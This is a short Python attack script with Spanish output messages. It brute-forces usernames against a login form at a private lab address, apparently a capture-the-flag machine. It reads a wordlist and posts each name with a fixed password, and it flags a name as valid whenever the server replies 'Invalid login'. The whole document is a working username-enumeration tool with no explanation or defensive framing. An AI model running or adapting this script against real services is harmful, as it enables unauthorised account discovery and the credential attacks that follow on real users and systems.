import os, requests, sys, signal

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <diccionario>\n")
    sys.exit(1)

target = "http://10.10.11.160:5000/login"
dicc = open(sys.argv[1])

print("\n[\033[1;34m*\033[1;37m] Iniciando fuerza bruta\n")

for line in dicc:
    username = line.strip()
    data = {'username': username,'password':'password'}
    request = requests.post(target, data=data)
    response = request.text
    if "Invalid login" in response:
        print(f"[\033[1;32m+\033[1;37m] El usuario {username} es valido\n")